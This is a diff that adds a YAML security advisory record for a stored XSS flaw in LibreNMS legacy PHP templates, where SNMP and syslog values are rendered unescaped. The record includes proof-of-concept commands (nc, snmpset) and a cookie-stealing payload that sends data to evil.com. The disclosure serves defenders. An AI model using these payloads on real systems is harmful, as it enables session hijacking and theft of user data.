@@ -1,0 +1,315 @@
+advisory_id: GHSA-7w8c-qgxg-m7jx
+datasource_id: github_osv/GHSA-7w8c-qgxg-m7jx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-7w8c-qgxg-m7jx/GHSA-7w8c-qgxg-m7jx.json
+aliases: []
+summary: |
+  LibreNMS — Stored XSS via SNMP/Syslog Data in Legacy Templates
+  ## Summary
+
+  Multiple legacy PHP template files in LibreNMS directly output SNMP-sourced and syslog-sourced data into HTML without escaping. An attacker who controls a monitored network device (via compromised SNMP agent or syslog sender) can inject arbitrary JavaScript that executes when any authenticated LibreNMS user views the affected pages.
+
+  ## Vulnerable Code
+
+  ### Location 1: Syslog `program` field (clearest instance)
+
+  **File:** `includes/html/print-syslog.inc.php:11,13`
+
+  ```php
+  $syslog_output .= '<td><strong>' . $entry['program'] . ' : </strong> ' . htmlspecialchars((string) $entry['msg']) . '</td>';
+  ```
+
+  The `program` field is output without `htmlspecialchars()` while the adjacent `msg` field IS properly escaped. The `program` value comes from syslog messages received from monitored devices.
+
+  ### Location 2: Alert details `ifAlias` (highest impact — main alerts page)
+
+  **File:** `includes/html/functions.inc.php:607`
+
+  ```php
+  $fault_detail .= $tmp_alerts['ifAlias'] . '; ';
+  ```
+
+  The `ifAlias` (port description) comes from SNMP polling and is stored in the `ports` table. When a port-related alert fires, `format_alert_details()` renders it unescaped. Multiple other fields in this function are also unescaped: `isisISAdjIPAddrAddress` (line 598), `service_desc`/`service_message` (lines 656,658), `bgpPeerDescr` (line 672), `mempool_descr` (line 686), `app_type` (line 709).
+
+  ### Location 3: Health pages — `mempool_descr`, `storage_descr`, `sensor_descr`
+
+  **File:** `includes/html/pages/device/health/mempool.inc.php:38`
+  ```php
+  echo "<h3 class='panel-title'>{$mempool->mempool_descr} ...";
+  ```
+
+  **File:** `includes/html/pages/device/health/storage.inc.php:27`
+  ```php
+  echo "<h3 class='panel-title'>{$drive['storage_descr']} ...";
+  ```
+
+  **File:** `includes/html/pages/device/health/sensors.inc.php:29`
+  ```php
+  echo "<h3 class='panel-title'>$sensor_descr ...";
+  ```
+
+  All three health page templates output SNMP-polled descriptions directly into `<h3>` tags without escaping.
+
+  ### Location 4: Pseudowires `ifAlias`
+
+  **File:** `includes/html/pages/pseudowires.inc.php:76`
+  ```php
+  echo "<tr ...><td colspan=2>" . $pw_a['ifAlias'] . '</td><td colspan=2>' . $pw_b['ifAlias'] . '</td></tr>';
+  ```
+
+  ### Location 5: VRF page `ifAlias`
+
+  **File:** `includes/html/pages/routing/vrf.inc.php:165`
+  ```php
+  echo "<div style='font-size: 9px;'>" . substr((string) short_port_descr($port['ifAlias']), 0, 22) . '</div>';
+  ```
+
+  ## Data Flow
+
+  ```
+  Attacker-controlled SNMP device/syslog source
+    → SNMP polling stores ifAlias/mempool_descr/etc in DB (no sanitization on write)
+    → OR syslog receiver stores program field in syslog table
+    → Authenticated user views alerts/health/syslog page
+    → Legacy PHP template echoes raw value into HTML
+    → XSS executes in victim's browser session
+  ```
+
+  ## Attack Scenario
+
+  1. Attacker compromises or controls a network device monitored by LibreNMS
+  2. Attacker configures the device's SNMP interface description (ifAlias) to: `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`
+  3. LibreNMS polls the device via SNMP and stores the malicious ifAlias in the `ports` table
+  4. When any alert fires for this port, the XSS payload executes for every authenticated user viewing the alerts page
+  5. Alternatively: attacker sends syslog messages with XSS in the program field, targeting the syslog viewer page
+
+  ## PoC
+
+  ### Syslog vector (simplest)
+  ```bash
+  # Send syslog message with XSS in program field
+  # Assuming LibreNMS syslog receiver is at 10.0.0.1:514
+  echo '<14>Mar 20 12:00:00 rogue-device <img/src=x onerror=alert(document.domain)>: test message' | nc -u 10.0.0.1 514
+  ```
+
+  ### SNMP vector
+  ```bash
+  # On attacker-controlled SNMP device, set interface description:
+  # snmpset -v2c -c private localhost IF-MIB::ifAlias.1 s '<img src=x onerror=alert(document.cookie)>'
+  # LibreNMS will poll this during next discovery/polling cycle
+  ```
+
+  ## Contrast with Properly Escaped Code
+
+  Newer Blade templates and some legacy code properly escape SNMP data:
+  - `includes/html/dev-overview-data.inc.php` uses `Clean::html()` for sysDescr, sysName, hardware
+  - `app/Http/Controllers/Device/Tabs/PortsController.php` uses `htmlentities()` on ifAlias
+  - `app/Http/Controllers/Table/EventlogController.php:97` uses `htmlspecialchars()` on message
+  - All Blade templates use `{{ }}` auto-escaping
+
+  The vulnerability exists specifically in the legacy `includes/html/` PHP files that have not been migrated to Blade.
+impacted_packages:
+  - purl: pkg:github/librenms/librenms
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/librenms/librenms
+        commit: 6782af940c3c495755923b520a302f3a1cb1ce6b
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:composer/librenms/librenms
+    affected_versions: vers:composer/<26.5.0
+    fixed_versions: vers:composer/26.5.0
+    affected_packages:
+      - pkg:composer/librenms/librenms@1.19.0
+      - pkg:composer/librenms/librenms@1.20.0
+      - pkg:composer/librenms/librenms@1.20.1
+      - pkg:composer/librenms/librenms@1.21.0
+      - pkg:composer/librenms/librenms@1.22.0
+      - pkg:composer/librenms/librenms@1.22.1
+      - pkg:composer/librenms/librenms@1.23.0
+      - pkg:composer/librenms/librenms@1.24.0
+      - pkg:composer/librenms/librenms@1.25.0
+      - pkg:composer/librenms/librenms@1.26.0
+      - pkg:composer/librenms/librenms@1.27.0
+      - pkg:composer/librenms/librenms@1.28.0
+      - pkg:composer/librenms/librenms@1.29.0
+      - pkg:composer/librenms/librenms@1.30.0
+      - pkg:composer/librenms/librenms@1.30.1
+      - pkg:composer/librenms/librenms@1.31.0
+      - pkg:composer/librenms/librenms@1.31.1
+      - pkg:composer/librenms/librenms@1.31.2
+      - pkg:composer/librenms/librenms@1.31.3
+      - pkg:composer/librenms/librenms@1.32.0
+      - pkg:composer/librenms/librenms@1.32.1
+      - pkg:composer/librenms/librenms@1.33.0
+      - pkg:composer/librenms/librenms@1.33.1
+      - pkg:composer/librenms/librenms@1.34.0
+      - pkg:composer/librenms/librenms@1.35.0
+      - pkg:composer/librenms/librenms@1.36.0
+      - pkg:composer/librenms/librenms@1.36.1
+      - pkg:composer/librenms/librenms@1.37.0
+      - pkg:composer/librenms/librenms@1.38.0
+      - pkg:composer/librenms/librenms@1.39.0
+      - pkg:composer/librenms/librenms@1.40.0
+      - pkg:composer/librenms/librenms@1.41.0
+      - pkg:composer/librenms/librenms@1.42.0
+      - pkg:composer/librenms/librenms@1.42.1
+      - pkg:composer/librenms/librenms@1.43.0
+      - pkg:composer/librenms/librenms@1.44.0
+      - pkg:composer/librenms/librenms@1.45.0
+      - pkg:composer/librenms/librenms@1.46.0
+      - pkg:composer/librenms/librenms@1.47.0
+      - pkg:composer/librenms/librenms@1.48.0
+      - pkg:composer/librenms/librenms@1.48.1
+      - pkg:composer/librenms/librenms@1.49.0
+      - pkg:composer/librenms/librenms@1.50.0
+      - pkg:composer/librenms/librenms@1.50.1
+      - pkg:composer/librenms/librenms@1.51.0
+      - pkg:composer/librenms/librenms@1.52.0
+      - pkg:composer/librenms/librenms@1.53.0
+      - pkg:composer/librenms/librenms@1.53.1
+      - pkg:composer/librenms/librenms@1.54.0
+      - pkg:composer/librenms/librenms@1.55.0
+      - pkg:composer/librenms/librenms@1.56.0
+      - pkg:composer/librenms/librenms@1.57.0
+      - pkg:composer/librenms/librenms@1.58.0
+      - pkg:composer/librenms/librenms@1.58.1
+      - pkg:composer/librenms/librenms@1.59.0
+      - pkg:composer/librenms/librenms@1.60.0
+      - pkg:composer/librenms/librenms@1.61.0
+      - pkg:composer/librenms/librenms@1.62.0
+      - pkg:composer/librenms/librenms@1.62.1
+      - pkg:composer/librenms/librenms@1.62.2
+      - pkg:composer/librenms/librenms@1.63.0
+      - pkg:composer/librenms/librenms@1.64.0
+      - pkg:composer/librenms/librenms@1.64.1
+      - pkg:composer/librenms/librenms@1.65.0
+      - pkg:composer/librenms/librenms@1.65.1
+      - pkg:composer/librenms/librenms@1.66.0
+      - pkg:composer/librenms/librenms@1.67.0
+      - pkg:composer/librenms/librenms@1.68.0
+      - pkg:composer/librenms/librenms@1.69.0
+      - pkg:composer/librenms/librenms@1.70.0
+      - pkg:composer/librenms/librenms@1.70.1
+      - pkg:composer/librenms/librenms@21.1.0
+      - pkg:composer/librenms/librenms@21.2.0
+      - pkg:composer/librenms/librenms@21.3.0
+      - pkg:composer/librenms/librenms@21.4.0
+      - pkg:composer/librenms/librenms@21.5.0
+      - pkg:composer/librenms/librenms@21.5.1
+      - pkg:composer/librenms/librenms@21.6.0
+      - pkg:composer/librenms/librenms@21.7.0
+      - pkg:composer/librenms/librenms@21.8.0
+      - pkg:composer/librenms/librenms@21.9.0
+      - pkg:composer/librenms/librenms@21.9.1
+      - pkg:composer/librenms/librenms@21.10.0
+      - pkg:composer/librenms/librenms@21.10.1
+      - pkg:composer/librenms/librenms@21.10.2
+      - pkg:composer/librenms/librenms@21.11.0
+      - pkg:composer/librenms/librenms@21.12.0
+      - pkg:composer/librenms/librenms@21.12.1
+      - pkg:composer/librenms/librenms@22.1.0
+      - pkg:composer/librenms/librenms@22.2.0
+      - pkg:composer/librenms/librenms@22.2.1
+      - pkg:composer/librenms/librenms@22.2.2
+      - pkg:composer/librenms/librenms@22.3.0
+      - pkg:composer/librenms/librenms@22.4.0
+      - pkg:composer/librenms/librenms@22.4.1
+      - pkg:composer/librenms/librenms@22.5.0
+      - pkg:composer/librenms/librenms@22.6.0
+      - pkg:composer/librenms/librenms@22.7.0
+      - pkg:composer/librenms/librenms@22.8.0
+      - pkg:composer/librenms/librenms@22.9.0
+      - pkg:composer/librenms/librenms@22.10.0
+      - pkg:composer/librenms/librenms@22.11.0
+      - pkg:composer/librenms/librenms@22.12.0
+      - pkg:composer/librenms/librenms@23.1.0
+      - pkg:composer/librenms/librenms@23.1.1
+      - pkg:composer/librenms/librenms@23.2.0
+      - pkg:composer/librenms/librenms@23.4.0
+      - pkg:composer/librenms/librenms@23.4.1
+      - pkg:composer/librenms/librenms@23.5.0
+      - pkg:composer/librenms/librenms@23.6.0
+      - pkg:composer/librenms/librenms@23.7.0
+      - pkg:composer/librenms/librenms@23.8.0
+      - pkg:composer/librenms/librenms@23.8.1
+      - pkg:composer/librenms/librenms@23.8.2
+      - pkg:composer/librenms/librenms@23.9.0
+      - pkg:composer/librenms/librenms@23.9.1
+      - pkg:composer/librenms/librenms@23.10.0
+      - pkg:composer/librenms/librenms@23.11.0
+      - pkg:composer/librenms/librenms@24.1.0
+      - pkg:composer/librenms/librenms@24.2.0
+      - pkg:composer/librenms/librenms@24.3.0
+      - pkg:composer/librenms/librenms@24.4.0
+      - pkg:composer/librenms/librenms@24.4.1
+      - pkg:composer/librenms/librenms@24.5.0
+      - pkg:composer/librenms/librenms@24.6.0
+      - pkg:composer/librenms/librenms@24.7.0
+      - pkg:composer/librenms/librenms@24.8.0
+      - pkg:composer/librenms/librenms@24.8.1
+      - pkg:composer/librenms/librenms@24.9.0
+      - pkg:composer/librenms/librenms@24.9.1
+      - pkg:composer/librenms/librenms@24.10.0
+      - pkg:composer/librenms/librenms@24.10.1
+      - pkg:composer/librenms/librenms@24.11.0
+      - pkg:composer/librenms/librenms@24.12.0
+      - pkg:composer/librenms/librenms@25.1.0
+      - pkg:composer/librenms/librenms@25.2.0
+      - pkg:composer/librenms/librenms@25.3.0
+      - pkg:composer/librenms/librenms@25.4.0
+      - pkg:composer/librenms/librenms@25.5.0
+      - pkg:composer/librenms/librenms@25.6.0
+      - pkg:composer/librenms/librenms@25.7.0
+      - pkg:composer/librenms/librenms@25.8.0
+      - pkg:composer/librenms/librenms@25.9.0
+      - pkg:composer/librenms/librenms@25.9.1
+      - pkg:composer/librenms/librenms@25.10.0
+      - pkg:composer/librenms/librenms@25.11.0
+      - pkg:composer/librenms/librenms@25.12.0
+      - pkg:composer/librenms/librenms@26.1.0
+      - pkg:composer/librenms/librenms@26.1.1
+      - pkg:composer/librenms/librenms@26.2.0
+      - pkg:composer/librenms/librenms@26.3.0
+      - pkg:composer/librenms/librenms@26.3.1
+      - pkg:composer/librenms/librenms@26.4.0
+      - pkg:composer/librenms/librenms@26.4.1
+    fixed_packages:
+      - pkg:composer/librenms/librenms@26.5.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-7w8c-qgxg-m7jx/GHSA-7w8c-qgxg-m7jx.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/librenms/librenms
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/commit/6782af940c3c495755923b520a302f3a1cb1ce6b
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/pull/19660
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/releases/tag/26.5.0
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/releases/tag/26.8.1
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/security/advisories/GHSA-7w8c-qgxg-m7jx
+    reference_type:
+    reference_id:
+exploits: []
